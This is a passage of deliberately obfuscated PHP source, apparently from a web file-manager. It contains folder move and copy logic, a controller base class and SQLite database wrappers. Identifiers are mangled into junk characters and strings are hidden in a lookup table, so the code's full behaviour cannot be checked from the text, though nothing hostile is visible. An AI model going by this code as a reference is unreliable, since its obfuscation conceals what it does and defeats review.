$¡¼Á®ö[88] && $Ô˜àÑ¶) { $this->folderSizeResetChildren($•Í¦Æˆä); } Model($¡¼Á®ö[199])->linkAdd($ù´ÈöŒî[$¡¼Á®ö[566]]); if ($Ô˜àÑ¶ && $ù´ÈöŒî[$¡¼Á®ö[598]]) { $this->removeNow($—öû–, !1); } $this->lockMoveEnd($—öû–); $this->lockWriteEnd($ó×ßÀ›, $ñïØª¼); $this->folderSizeReset($¹ÇıŞĞ[$¡¼Á®ö[432]]); $this->folderSizeReset($ó×ßÀ›); $Ø™ÆÆ˜¡ = array($¹ÇıŞĞ[$¡¼Á®ö[432]], $ó×ßÀ›); if ($¹ÇıŞĞ[$¡¼Á®ö[410]] == $¡¼Á®ö[88]) { $Ø™ÆÆ˜¡[] = $—öû–; } $this->updateModifyTime($Ø™ÆÆ˜¡); Model($¡¼Á®ö[570])->eventMove($—öû–, $¹ÇıŞĞ[$¡¼Á®ö[432]], $ó×ßÀ›); Hook::trigger($¡¼Á®ö[597], $ûüó£÷); return $•Í¦Æˆä; } private function _move($Ï„¨ñ‹¾, $«¹•áüó, $ÓõÂ, &$ª†û¯¼ì, $“Êëˆê = '') { $Ë‹ŞÀóù =& $_SERVER[³·—™¤¢]; $ğØ¯•®÷ = $this->sourceInfo($Ï„¨ñ‹¾); $ÅÄó¶ÜÀ = $ğØ¯•®÷[$Ë‹ŞÀóù[410]] == $Ë‹ŞÀóù[88]; $ê´âô€¿ = $“Êëˆê ? $“Êëˆê : $ğØ¯•®÷[$Ë‹ŞÀóù[32]]; $ùâéñèÂ = $this->fileNameExistCache($«¹•áüó, $ê´âô€¿); $this->lockMoveStart($Ï„¨ñ‹¾); $this->lockWriteStart($«¹•áüó, $ê´âô€¿); if (!$ùâéñèÂ) { return $this->_moveForce($Ï„¨ñ‹¾, $«¹•áüó, $ê´âô€¿); } $àøŠæ À = $ùâéñèÂ; $±¼õıĞ = !1; if ($ÅÄó¶ÜÀ) { if ($ÓõÂ == REPEAT_RENAME_FOLDER) { $ê´âô€¿ = $this->fileNameAuto($«¹•áüó, $ê´âô€¿, $ÓõÂ, $ÅÄó¶ÜÀ); $àøŠæ À = $this->_moveForce($Ï„¨ñ‹¾, $«¹•áüó, $ê´âô€¿); } else { if ($ÓõÂ == REPEAT_RENAME_FOLDER) { $ÓõÂ = REPEAT_RENAME; } $Îßôˆõï = $this->_childrenListSelect($Ï„¨ñ‹¾); foreach ($Îßôˆõï as $¤…¨Ä”‹) { $this->_move($¤…¨Ä”‹[$Ë‹ŞÀóù[402]], $ùâéñèÂ, $ÓõÂ, $ª†û¯¼ì); } $±¼õıĞ = !0; } } else { if ($ÓõÂ == REPEAT_SKIP) { $±¼õıĞ = !0; } else { if ($ÓõÂ == REPEAT_RENAME || $ÓõÂ == REPEAT_RENAME_FOLDER) { $ê´âô€¿ = $this->fileNameAuto($«¹•áüó, $ê´âô€¿, $ÓõÂ, $ÅÄó¶ÜÀ); $àøŠæ À = $this->_moveForce($Ï„¨ñ‹¾, $«¹•áüó, $ê´âô€¿); } else { if ($ÓõÂ == REPEAT_REPLACE) { $¦÷ç‰øŞ = $this->sourceInfoCache($ùâéñèÂ); $‡Üâáú = $this->fileHistory($¦÷ç‰øŞ, $ğØ¯•®÷[$Ë‹ŞÀóù[468]], $ğØ¯•®÷[$Ë‹ŞÀóù[76]]); $±¼õıĞ = !0; if ($‡Üâáú) { $ª†û¯¼ì[$Ë‹ŞÀóù[566]][] = $ğØ¯•®÷[$Ë‹ŞÀóù[468]]; } } } } } if ($±¼õıĞ && !$ª†û¯¼ì[$Ë‹ŞÀóù[598]]) { $ª†û¯¼ì[$Ë‹ŞÀóù[598]] = !0; } return $àøŠæ À; } private function _moveForce($‘¡Å‰Óó, $ÛÔíÈËŒ, $½ÌÜûÄ) { $æ×¤ò‹ =& $_SERVER[³·—™¤¢]; $²·Ò÷¨È = $this->sourceInfo($‘¡Å‰Óó); $¯»‡‡Î = $this->sourceInfo($ÛÔíÈËŒ); $î£”Ü’ = $²·Ò÷¨È[$æ×¤ò‹[410]] == $æ×¤ò‹[88]; $¢ˆÕ²Ûš = array($æ×¤ò‹[401] => $¯»‡‡Î[$æ×¤ò‹[402]], $æ×¤ò‹[590] => $¯»‡‡Î[$æ×¤ò‹[521]] . $¯»‡‡Î[$æ×¤ò‹[402]] . $æ×¤ò‹[50], $æ×¤ò‹[586] => $¯»‡‡Î[$æ×¤ò‹[411]], $æ×¤ò‹[587] => $¯»‡‡Î[$æ×¤ò‹[505]], $æ×¤ò‹[589] => USER_ID, $æ×¤ò‹[420] => $½ÌÜûÄ); $¦ ¥¹ùÌ = $²·Ò÷¨È[$æ×¤ò‹[411]] == SourceModel::TYPE_GROUP && $¯»‡‡Î[$æ×¤ò‹[411]] == SourceModel::TYPE_GROUP && $²·Ò÷¨È[$æ×¤ò‹[505]] == $¯»‡‡Î[$æ×¤ò‹[505]]; if (!$¦ ¥¹ùÌ && $this->moveClearAuth) { Model($æ×¤ò‹[502])->authClear($‘¡Å‰Óó); } $óÏß³Î„ = $²·Ò÷¨È[$æ×¤ò‹[431]] == $æ×¤ò‹[88] && $¯»‡‡Î[$æ×¤ò‹[431]] != $æ×¤ò‹[88]; if ($óÏß³Î„) { $¢ˆÕ²Ûš[$æ×¤ò‹[430]] = 0; } if ($î£”Ü’) { $Å‹ÃˆâÎ = array($æ×¤ò‹[590] => array($æ×¤ò‹[550], $²·Ò÷¨È[$æ×¤ò‹[521]] . $²·Ò÷¨È[$æ×¤ò‹[402]] . $æ×¤ò‹[551])); $û¯Ñõù½ = $²·Ò÷¨È[$æ×¤ò‹[521]] . $²·Ò÷¨È[$æ×¤ò‹[402]] . $æ×¤ò‹[50]; $–Ñ¨çÔÄ = $¯»‡‡Î[$æ×¤ò‹[521]] . $¯»‡‡Î[$æ×¤ò‹[402]] . $æ×¤ò‹[50] . $²·Ò÷¨È[$æ×¤ò‹[402]] . $æ×¤ò‹[50]; $¢µœ¥î = array($æ×¤ò‹[590] => array($æ×¤ò‹[599], "\162\145\160\154\x61\143\145\50\x70\x61\x72\x65\x6e\x74\x4c\x65\166\145\154\x2c\x27{$û¯Ñõù½}\x27\54\x27{$–Ñ¨çÔÄ}\x27\51"), $æ×¤ò‹[586] => $¯»‡‡Î[$æ×¤ò‹[411]], $æ×¤ò‹[587] => $¯»‡‡Î[$æ×¤ò‹[505]]); if ($óÏß³Î„) { $¢µœ¥î[$æ×¤ò‹[430]] = 0; } $this->where($Å‹ÃˆâÎ)->data($¢µœ¥î)->save(); } $this->where(array($æ×¤ò‹[417] => $‘¡Å‰Óó))->data($¢ˆÕ²Ûš)->save(); return $‘¡Å‰Óó; } private function clearShare($Ÿø¥ãÉç, $—¤“æ›“) { $Ü‚˜ª‚ª =& $_SERVER[³·—™¤¢]; $¡×ôäµÚ = $this->sourceInfo($Ÿø¥ãÉç); $©„Ó€º = $this->sourceInfo($—¤“æ›“); if ($¡×ôäµÚ[$Ü‚˜ª‚ª[505]] == $©„Ó€º[$Ü‚˜ª‚ª[505]] && $¡×ôäµÚ[$Ü‚˜ª‚ª[411]] == $Ü‚˜ª‚ª[600]) { return; } $šÊíåÎâ = array($Ü‚˜ª‚ª[521] => array($Ü‚˜ª‚ª[550], $¡×ôäµÚ[$Ü‚˜ª‚ª[521]] . $Ÿø¥ãÉç . $Ü‚˜ª‚ª[551])); $úÔÈüë¹ = $this->field($Ü‚˜ª‚ª[417])->where($šÊíåÎâ)->getField($Ü‚˜ª‚ª[402], !0); if (!$úÔÈüë¹) { return; } $šÊíåÎâ = array($Ü‚˜ª‚ª[402] => array($Ü‚˜ª‚ª[7], $úÔÈüë¹), $Ü‚˜ª‚ª[496] => 1); $‰¥ô·˜ì = Model($Ü‚˜ª‚ª[601])->field($Ü‚˜ª‚ª[489])->where($šÊíåÎâ)->select(); if (!$‰¥ô·˜ì) { return; } $‰¥ô·˜ì = array_to_keyvalue($‰¥ô·˜ì, $Ü‚˜ª‚ª[12], $Ü‚˜ª‚ª[489]); $šÊíåÎâ = array($Ü‚˜ª‚ª[489] => array($Ü‚˜ª‚ª[7], $‰¥ô·˜ì)); Model($Ü‚˜ª‚ª[601])->where($šÊíåÎâ)->save(array($Ü‚˜ª‚ª[496] => 0)); Model($Ü‚˜ª‚ª[602])->where($šÊíåÎâ)->delete(); } public function copyFolderFromIO($šğ¸Ô‡¬, $ÆÑÆúÌú, $ÂñÜõÉâ, $°ÍÓñÏ˜, $´æ‘âÃ§, $şò–óàâ = false) { $ù©Ñì‚ƒ =& $_SERVER[³·—™¤¢]; $Ê®Àæß = array($ù©Ñì‚ƒ[567] => array(), $ù©Ñì‚ƒ[568] => array(), $ù©Ñì‚ƒ[566] => array(), $ù©Ñì‚ƒ[603] => array()); $ƒôòë¡ï = $şò–óàâ ? $şò–óàâ : $šğ¸Ô‡¬->pathThis($ÆÑÆúÌú); $¦ëÈï¬÷ = $this->fileNameExist($ÂñÜõÉâ, $ƒôòë¡ï); $æœÁËÚ¯ = $this->mkdir($ÂñÜõÉâ, $ƒôòë¡ï, $°ÍÓñÏ˜); if (!$¦ëÈï¬÷ || $°ÍÓñÏ˜ == REPEAT_RENAME_FOLDER) { $°ÍÓñÏ˜ = !1; } if ($¦ëÈï¬÷) { $this->_childrenAllMake($¦ëÈï¬÷); } Hook::trigger($ù©Ñì‚ƒ[604]); $this->_copyChildTo($šğ¸Ô‡¬, $ÆÑÆúÌú, $æœÁËÚ¯, $°ÍÓñÏ˜, $Ê®Àæß, $´æ‘âÃ§); Hook::trigger($ù©Ñì‚ƒ[605]); if ($æœÁËÚ¯) { $this->folderSizeResetChildren($æœÁËÚ¯); } $this->_childrenListClear(); Model($ù©Ñì‚ƒ[569])->addAll($Ê®Àæß[$ù©Ñì‚ƒ[567]], array(), !0); Model($ù©Ñì‚ƒ[570])->eventCopy($æœÁËÚ¯); $this->saveAll($Ê®Àæß[$ù©Ñì‚ƒ[568]]); Model($ù©Ñì‚ƒ[471])->linkAdd($Ê®Àæß[$ù©Ñì‚ƒ[566]]); Model($ù©Ñì‚ƒ[471])->remove($Ê®Àæß[$ù©Ñì‚ƒ[603]]); $this->folderSizeReset($ÂñÜõÉâ); $this->updateModifyTime($ÂñÜõÉâ); return $æœÁËÚ¯; } private function _copyChildTo($—Ñ‚…´Ñ, $åÄĞÂëÈ, $”æúïª», $Ê¯†»áö, &$¢Š—±“Û, $öò´Ä»è) { $¹°õ¦¡  =& $_SERVER[³·—™¤¢]; $®şâüÚÓ = $this->sourceInfoCache($”æúïª»); $Äµú£•Ä = $—Ñ‚…´Ñ->listPath($åÄĞÂëÈ); $Äµú£•Ä = $Äµú£•Ä ? $Äµú£•Ä : array($¹°õ¦¡ [83] => array(), $¹°õ¦¡ [82] => array()); $Ú›¥±ëœ = array_merge($Äµú£•Ä[$¹°õ¦¡ [83]], $Äµú£•Ä[$¹°õ¦¡ [82]]); $óÅºâ€º = $this->_addFiles($—Ñ‚…´Ñ, $Äµú£•Ä[$¹°õ¦¡ [83]], $öò´Ä»è); $Í’ˆ±Ïé = array(); foreach ($Ú›¥±ëœ as &$–ÎÍĞœ») { if (isset($óÅºâ€º[$–ÎÍĞœ»[$¹°õ¦¡ [32]]])) { $–ÎÍĞœ» = $óÅºâ€º[$–ÎÍĞœ»[$¹°õ¦¡ [32]]]; } $–ÎÍĞœ»[$¹°õ¦¡ [410]] = $–ÎÍĞœ»[$¹°õ¦¡ [33]] == $¹°õ¦¡ [75]; $–ÎÍĞœ»[$¹°õ¦¡ [412]] = substr(_get($–ÎÍĞœ», $¹°õ¦¡ [174], $¹°õ¦¡ [12]), 0, 10); $–ÎÍĞœ»[$¹°õ¦¡ [76]] = _get($–ÎÍĞœ», $¹°õ¦¡ [76], 0); $–ÎÍĞœ»[$¹°õ¦¡ [468]] = _get($–ÎÍĞœ», $¹°õ¦¡ [468], 0); if (!isset($–ÎÍĞœ»[$¹°õ¦¡ [606]]) && $–ÎÍĞœ»[$¹°õ¦¡ [468]]) { $¢Š—±“Û[$¹°õ¦¡ [603]][] = $–ÎÍĞœ»[$¹°õ¦¡ [468]]; } if ($Ê¯†»áö) { $èÍ‘Óğ  = $this->fileNameExistCache($”æúïª», $–ÎÍĞœ»[$¹°õ¦¡ [32]]); if ($èÍ‘Óğ ) { if ($–ÎÍĞœ»[$¹°õ¦¡ [410]] || $Ê¯†»áö == REPEAT_SKIP) { continue; } if ($Ê¯†»áö == REPEAT_REPLACE) { $§»›‹Ÿ = $this->sourceInfoCache($èÍ‘Óğ ); $Œõ•‘Ä° = $this->fileHistory($§»›‹Ÿ, $–ÎÍĞœ»[$¹°õ¦¡ [468]], $–ÎÍĞœ»[$¹°õ¦¡ [76]]); if ($Œõ•‘Ä°) { $¢Š—±“Û[$¹°õ¦¡ [566]][] = $–ÎÍĞœ»[$¹°õ¦¡ [468]]; } continue; } else { if ($Ê¯†»áö == REPEAT_RENAME) { $–ÎÍĞœ»[$¹°õ¦¡ [32]] = $this->fileNameAutoCache($”æúïª», $–ÎÍĞœ»[$¹°õ¦¡ [32]], $Ê¯†»áö, !1); } } } } if (!$–ÎÍĞœ»[$¹°õ¦¡ [410]] && $–ÎÍĞœ»[$¹°õ¦¡ [468]] == 0) { continue; } if (!$–ÎÍĞœ»[$¹°õ¦¡ [410]] && $–ÎÍĞœ»[$¹°õ¦¡ [468]]) { $¢Š—±“Û[$¹°õ¦¡ [566]][] = $–ÎÍĞœ»[$¹°õ¦¡ [468]]; } $Í’ˆ±Ïé[] = $this->_makeItemData($–ÎÍĞœ», $®şâüÚÓ, $–ÎÍĞœ»[$¹°õ¦¡ [32]]); } unset($–ÎÍĞœ»); if (!empty($Í’ˆ±Ïé)) { $this->addAll($Í’ˆ±Ïé); $this->_childrenListSelect($”æúïª»); } $½ÓÖàÑå = $this->_childrenList($”æúïª»); $½ÓÖàÑå = array_to_keyvalue($½ÓÖàÑå, $¹°õ¦¡ [32]); foreach ($Ú›¥±ëœ as $–ÎÍĞœ») { $§»›‹Ÿ = $½ÓÖàÑå[$–ÎÍĞœ»[$¹°õ¦¡ [32]]]; $·ñ‚±©Ï = $§»›‹Ÿ[$¹°õ¦¡ [402]]; $this->_copyApplyMeta($§»›‹Ÿ, $¢Š—±“Û); if ($–ÎÍĞœ»[$¹°õ¦¡ [33]] == $¹°õ¦¡ [75]) { $–ÎÍĞœ»[$¹°õ¦¡ [84]] = $—Ñ‚…´Ñ->getPathInner($–ÎÍĞœ»[$¹°õ¦¡ [84]]); $this->_copyChildTo($—Ñ‚…´Ñ, $–ÎÍĞœ»[$¹°õ¦¡ [84]], $·ñ‚±©Ï, $Ê¯†»áö, $¢Š—±“Û, $öò´Ä»è); } } } private function _addFiles($¹­İ¬›¸, $¤÷Â‡¶, $½†ª‘˜Ú) { $Ó…‡º±è =& $_SERVER[³·—™¤¢]; if (!$¤÷Â‡¶ || count($¤÷Â‡¶) == 0) { return array(); } $Å®îâ¨Ä = array(); foreach ($¤÷Â‡¶ as &$ÓÒ”¥ë) { Hook::trigger($Ó…‡º±è[607], $ÓÒ”¥ë); $ÓÒ”¥ë[$Ó…‡º±è[84]] = $¹­İ¬›¸->getPathInner($ÓÒ”¥ë[$Ó…‡º±è[84]]); $ÅšßâÀ® = $¹­İ¬›¸->hashSimple($ÓÒ”¥ë[$Ó…‡º±è[84]]); $•­»ï‚¤ = $¹­İ¬›¸->hashMd5($ÓÒ”¥ë[$Ó…‡º±è[84]]); if (strlen($•­»ï‚¤) > 10 && !isset($Å®îâ¨Ä[$•­»ï‚¤])) { $Å®îâ¨Ä[$•­»ï‚¤] = array(); } $ÓÒ”¥ë[$Ó…‡º±è[177]] = $ÅšßâÀ®; $ÓÒ”¥ë[$Ó…‡º±è[176]] = $•­»ï‚¤; $Å®îâ¨Ä[$•­»ï‚¤][] =& $ÓÒ”¥ë; if (count($Å®îâ¨Ä[$•­»ï‚¤]) > 1) { $ÓÒ”¥ë[$Ó…‡º±è[606]] = !0; } Hook::trigger($Ó…‡º±è[608], $ÓÒ”¥ë); } unset($ÓÒ”¥ë); $šùªŠ¢¦ = array($Ó…‡º±è[176] => array($Ó…‡º±è[7], array_keys($Å®îâ¨Ä))); $Ü÷ªÉµ = Model($Ó…‡º±è[609]); $¦Ï£ë« = $Ü÷ªÉµ->where($šùªŠ¢¦)->select(); $¦Ï£ë« = $¦Ï£ë« ? $¦Ï£ë« : array(); foreach ($¦Ï£ë« as $µğÓÑ£·) { if (!isset($Å®îâ¨Ä[$µğÓÑ£·[$Ó…‡º±è[176]]])) { continue; } $ä’—¼¿ = $Å®îâ¨Ä[$µğÓÑ£·[$Ó…‡º±è[176]]]; foreach ($ä’—¼¿ as &$ÓÒ”¥ë) { $ÓÒ”¥ë[$Ó…‡º±è[468]] = $µğÓÑ£·[$Ó…‡º±è[468]]; $ÓÒ”¥ë[$Ó…‡º±è[606]] = !0; } unset($ÓÒ”¥ë); } $ïñ ü´‘ = array(); foreach ($¤÷Â‡¶ as $´…ßö) { Hook::trigger($Ó…‡º±è[610], $´…ßö); if (isset($´…ßö[$Ó…‡º±è[606]]) && $´…ßö[$Ó…‡º±è[606]]) { Hook::trigger($Ó…‡º±è[611], $´…ßö); continue; } $ı­Ä’Ü¦ = $¹­İ¬›¸->getPathInner($´…ßö[$Ó…‡º±è[84]]); $³–ş£Úú = $Ü÷ªÉµ->addFileMake($ı­Ä’Ü¦, $´…ßö[$Ó…‡º±è[76]], $´…ßö[$Ó…‡º±è[177]], $´…ßö[$Ó…‡º±è[176]], $´…ßö[$Ó…‡º±è[32]], $½†ª‘˜Ú); Hook::trigger($Ó…‡º±è[611], $´…ßö); if (!is_array($³–ş£Úú)) { continue; } $ïñ ü´‘[] = $³–ş£Úú; } $Ü÷ªÉµ->addAll($ïñ ü´‘); $šùªŠ¢¦ = array($Ó…‡º±è[176] => array($Ó…‡º±è[7], array_keys($Å®îâ¨Ä))); $¦Ï£ë« = $Ü÷ªÉµ->where($šùªŠ¢¦)->select(); $¦Ï£ë« = $¦Ï£ë« ? $¦Ï£ë« : array(); foreach ($¦Ï£ë« as $µğÓÑ£·) { if (!isset($Å®îâ¨Ä[$µğÓÑ£·[$Ó…‡º±è[176]]])) { continue; } $ŸúßÙÙÎ =& $Å®îâ¨Ä[$µğÓÑ£·[$Ó…‡º±è[176]]]; foreach ($ŸúßÙÙÎ as &$ÓÒ”¥ë) { $ÓÒ”¥ë[$Ó…‡º±è[468]] = $µğÓÑ£·[$Ó…‡º±è[468]]; } unset($ÓÒ”¥ë); } $²¹œ”„ = array(); foreach ($¤÷Â‡¶ as $Éî§Ú´¦) { $²¹œ”„[$Éî§Ú´¦[$Ó…‡º±è[32]]] = $Éî§Ú´¦; } return $²¹œ”„; } } goto FòÒ‰Âß®ë; Bó¤î¥¤÷¯: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Ìäæº‚¼ =& $_SERVER[³·—™¤¢]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Ìäæº‚¼[6]] =& $config; $this->values[$Ìäæº‚¼[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Ìäæº‚¼[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÀÒº´³Ç) { if (1 === func_num_args()) { $this->{$ÀÒº´³Ç} = new $ÀÒº´³Ç(); } else { $õÖìèÉù = new ReflectionClass($ÀÒº´³Ç); $Ü“Ïùûğ = func_get_args(); array_shift($Ü“Ïùûğ); $this->{$ÀÒº´³Ç} = $õÖìèÉù->newInstanceArgs($Ü“Ïùûğ); } return $this->{$ÀÒº´³Ç}; } public function routeBind($ğßÏµá, $ë­ãÛŞó, $Ü€¤‡Ğø = 3) { $¹Õ»Ò›Š =& $_SERVER[³·—™¤¢]; $ˆ¦’‡–¡ = $this->in[$¹Õ»Ò›Š[9]]; $ğßÏµá = str_replace($¹Õ»Ò›Š[10], $¹Õ»Ò›Š[11], trim(trim($ğßÏµá, $¹Õ»Ò›Š[8]), $¹Õ»Ò›Š[12])); if (!$ğßÏµá || count($ˆ¦’‡–¡) <= $Ü€¤‡Ğø) { return !1; } $½«…±Ÿİ = !0; $¬ÇºÈÑñ = explode($¹Õ»Ò›Š[8], $ğßÏµá); for ($İ¯˜›¹‡ = 0; $İ¯˜›¹‡ < count($¬ÇºÈÑñ); $İ¯˜›¹‡++) { if ($¬ÇºÈÑñ[$İ¯˜›¹‡] != $ˆ¦’‡–¡[$Ü€¤‡Ğø + $İ¯˜›¹‡]) { $½«…±Ÿİ = !1; break; } } if (!$½«…±Ÿİ) { return; } call_user_func_array(array($this, $ë­ãÛŞó), array()); } public function routeArgs($ˆ»Áé„à = 3) { $Ã¨îÖé = $this->in[$_SERVER[³·—™¤¢][9]]; if (count($Ã¨îÖé) <= $ˆ»Áé„à) { return array(); } $õ•ˆŸ™Ï = array(); for ($ß•°èªÉ = $ˆ»Áé„à; $ß•°èªÉ < count($Ã¨îÖé); $ß•°èªÉ += 2) { $õ•ˆŸ™Ï[$Ã¨îÖé[$ß•°èªÉ]] = $Ã¨îÖé[$ß•°èªÉ + 1]; $this->in[$Ã¨îÖé[$ß•°èªÉ]] = $Ã¨îÖé[$ß•°èªÉ + 1]; } return $õ•ˆŸ™Ï; } protected function assign($´ê²Ü, $Ñğ×â Ó) { $this->values[$´ê²Ü] = $Ñğ×â Ó; } protected function display($Ïï•ıª“) { ob_end_clean(); extract($this->values); require $this->tpl . $Ïï•ıª“; } } class DbSqliteBase extends Db { public function __construct($„ñ Â‹Ë = '') { $İÃÔÕ©• =& $_SERVER[³·—™¤¢]; if (!extension_loaded($İÃÔÕ©•[13])) { think_exception(think_lang($İÃÔÕ©•[14]) . $İÃÔÕ©•[15]); } if (!empty($„ñ Â‹Ë)) { if (!isset($„ñ Â‹Ë[$İÃÔÕ©•[16]])) { $„ñ Â‹Ë[$İÃÔÕ©•[16]] = 438; } $this->config = $„ñ Â‹Ë; if (empty($this->config[$İÃÔÕ©•[17]])) { $this->config[$İÃÔÕ©•[17]] = array(); } } } public function connect($Û÷õéª¬ = '', $Ò§ıÒä = 0) { $×şÄÇãâ =& $_SERVER[³·—™¤¢]; if (!isset($this->linkID[$Ò§ıÒä])) { if (empty($Û÷õéª¬)) { $Û÷õéª¬ = $this->config; } $‡ë¶–ÙÕ = !empty($Û÷õéª¬[$×şÄÇãâ[17]][$×şÄÇãâ[18]]) ? $Û÷õéª¬[$×şÄÇãâ[17]][$×şÄÇãâ[18]] : $this->pconnect; $¥˜ÍŒæñ = $‡ë¶–ÙÕ ? $×şÄÇãâ[19] : $×şÄÇãâ[20]; $this->linkID[$Ò§ıÒä] = $¥˜ÍŒæñ($Û÷õéª¬[$×şÄÇãâ[21]], $Û÷õéª¬[$×şÄÇãâ[16]]); if (!$this->linkID[$Ò§ıÒä]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Ò§ıÒä], 30000); if (1 != think_config($×şÄÇãâ[22])) { unset($this->config); } } return $this->linkID[$Ò§ıÒä]; } public function free() { $this->queryID = null; } public function query($­Äø›â½) { $•ŒÜé• =& $_SERVER[³·—™¤¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $­Äø›â½; if ($this->queryID) { $this->free(); } think_action_status($•ŒÜé•[23], 1); think_status($•ŒÜé•[24]); $this->queryID = sqlite_query($this->_linkID, $­Äø›â½); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $éœİÃÃŞ = $this->getAll(); return $éœİÃÃŞ; } } public function execute($º¹üßÊ) { $€”†Œó =& $_SERVER[³·—™¤¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $º¹üßÊ; if ($this->queryID) { $this->free(); } think_action_status($€”†Œó[25], 1); think_status($€”†Œó[24]); $éğ’„´Œ = sqlite_exec($this->_linkID, $º¹üßÊ); $this->debug(); if (!1 === $éğ’„´Œ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[³·—™¤¢][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $èôìÉÉ = sqlite_query($this->_linkID, $_SERVER[³·—™¤¢][27]); if (!$èôìÉÉ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ŸÄÀíŠÔ = sqlite_query($this->_linkID, $_SERVER[³·—™¤¢][28]); if (!$ŸÄÀíŠÔ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ì×”š³ë = array(); if ($this->numRows > 0) { for ($¨Ïú¬Œ = 0; $¨Ïú¬Œ < $this->numRows; $¨Ïú¬Œ++) { $ì×”š³ë[$¨Ïú¬Œ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ì×”š³ë; } public function getFields($‘Îë²‚¯) { $ØÌàÜà¿ =& $_SERVER[³·—™¤¢]; $¦½¥ÖúÎ = $this->query($ØÌàÜà¿[29] . $‘Îë²‚¯ . $ØÌàÜà¿[30]); $ıİ‰³“š = array(); if ($¦½¥ÖúÎ) { foreach ($¦½¥ÖúÎ as $¸±¬¾âê => $­Œƒ…Åğ) { $ıİ‰³“š[$­Œƒ…Åğ[$ØÌàÜà¿[31]]] = array($ØÌàÜà¿[32] => $­Œƒ…Åğ[$ØÌàÜà¿[31]], $ØÌàÜà¿[33] => $­Œƒ…Åğ[$ØÌàÜà¿[34]], $ØÌàÜà¿[35] => (bool) ($­Œƒ…Åğ[$ØÌàÜà¿[36]] === $ØÌàÜà¿[12]), $ØÌàÜà¿[37] => $­Œƒ…Åğ[$ØÌàÜà¿[38]], $ØÌàÜà¿[39] => strtolower($­Œƒ…Åğ[$ØÌàÜà¿[40]]) == $ØÌàÜà¿[41], $ØÌàÜà¿[42] => strtolower($­Œƒ…Åğ[$ØÌàÜà¿[43]]) == $ØÌàÜà¿[44]); } } return $ıİ‰³“š; } public function getTables($ä“²Á†¨ = '') { $İ“íä½Ï =& $_SERVER[³·—™¤¢]; $óÍ˜†À¹ = $this->query($İ“íä½Ï[45] . $İ“íä½Ï[46] . $İ“íä½Ï[47]); $ƒâ×¿¯ñ = array(); foreach ($óÍ˜†À¹ as $ùàæ‹³¢ => $û£ÖšÇ) { $ƒâ×¿¯ñ[$ùàæ‹³¢] = current($û£ÖšÇ); } return $ƒâ×¿¯ñ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Æ×·Õ´ =& $_SERVER[³·—™¤¢]; $˜ÛÏşÅ– = sqlite_last_error($this->_linkID); $this->error = $˜ÛÏşÅ– . $Æ×·Õ´[4] . sqlite_error_string($˜ÛÏşÅ–); if ($Æ×·Õ´[12] != $this->queryStr) { $this->error .= LNG($Æ×·Õ´[48]) . $this->queryStr; } think_trace($this->error, $Æ×·Õ´[12], $Æ×·Õ´[49]); return $this->error; } public function escapeString($ëìú‡š¶) { return sqlite_escape_string($ëìú‡š¶); } public function parseLimit($ÕˆÖ‚•) { $±Ç„ëÅ =& $_SERVER[³·—™¤¢]; $ÅŞÅœè = $±Ç„ëÅ[12]; if (!empty($ÕˆÖ‚•)) { $ÕˆÖ‚• = explode($±Ç„ëÅ[50], $ÕˆÖ‚•); if (count($ÕˆÖ‚•) > 1) { $ÅŞÅœè .= $±Ç„ëÅ[51] . $ÕˆÖ‚•[1] . $±Ç„ëÅ[52] . $ÕˆÖ‚•[0] . $±Ç„ëÅ[53]; } else { $ÅŞÅœè .= $±Ç„ëÅ[51] . $ÕˆÖ‚•[0] . $±Ç„ëÅ[53]; } } return $ÅŞÅœè; } } class DbSqlite3Base extends Db { public function __construct($ÓùÖå¯¼ = '') { $Ôº„®ÈÔ =& $_SERVER[³·—™¤¢]; if (!class_exists($Ôº„®ÈÔ[54])) { think_exception(think_lang($Ôº„®ÈÔ[14]) . $Ôº„®ÈÔ[55]); } if (!empty($ÓùÖå¯¼)) { if (!isset($ÓùÖå¯¼[$Ôº„®ÈÔ[16]])) { $ÓùÖå¯¼[$Ôº„®ÈÔ[16]] = 438; } $this->config = $ÓùÖå¯¼; if (empty($this->config[$Ôº„®ÈÔ[17]])) { $this->config[$Ôº„®ÈÔ[17]] = array(); } } } public function connect($»©µäãÜ = '', $ª‘úâ· = 0) { $µ’Êùœ¥ =& $_SERVER[³·—™¤¢]; if (!isset($this->linkID[$ª‘úâ·])) { if (empty($»©µäãÜ)) { $»©µäãÜ = $this->config; } $this->linkID[$ª‘úâ·] = new SQLite3($»©µäãÜ[$µ’Êùœ¥[21]]); if (!$this->linkID[$ª‘úâ·]) { think_exception($this->linkID[$ª‘úâ·]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ª‘úâ·]->busyTimeout(30000); if (1 != think_config($µ’Êùœ¥[22])) { unset($this->config); } } return $this->linkID[$ª‘úâ·]; } public function free() { $this->queryID = null; } public function query($š«„‡ø) { $¨Ç•İ„Ù =& $_SERVER[³·—™¤¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $š«„‡ø; if ($this->queryID) { $this->free(); } think_action_status($¨Ç•İ„Ù[23], 1); think_status($¨Ç•İ„Ù[24]); $this->queryID = $this->_linkID->query($š«„‡ø); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $õ’Ò·ÍÕ = $this->getAll(); $this->numRows = count($õ’Ò·ÍÕ); return $õ’Ò·ÍÕ; } } public function 